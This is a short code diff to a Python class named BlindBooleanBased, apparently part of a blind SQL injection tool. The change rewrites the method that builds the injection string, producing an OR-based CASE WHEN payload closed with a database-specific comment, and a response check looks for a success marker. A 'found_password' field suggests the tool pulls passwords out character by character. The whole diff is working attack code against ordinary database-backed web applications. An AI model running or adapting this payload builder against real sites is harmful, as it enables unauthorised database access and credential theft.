@@ -8,7 +8,9 @@ class BlindBooleanBased(BaseSQLi):
         self.found_password = "" 
         self.signal = signal
     def build_condition_payload(self, condition):
-        return f"'||(SELECT CASE WHEN ({condition}) THEN 1 ELSE 0 END{DB_CONFIG[self.db_type]['from_dual']})||'"
+        from_dual = DB_CONFIG[self.db_type]['from_dual']
+        comment = DB_CONFIG[self.db_type]['comment']
+        return f"x' OR (SELECT CASE WHEN ({condition}) THEN 1 ELSE 0 END{from_dual})=1{comment}"
 
     def check_signal(self, response):
         return self.signal in response.text
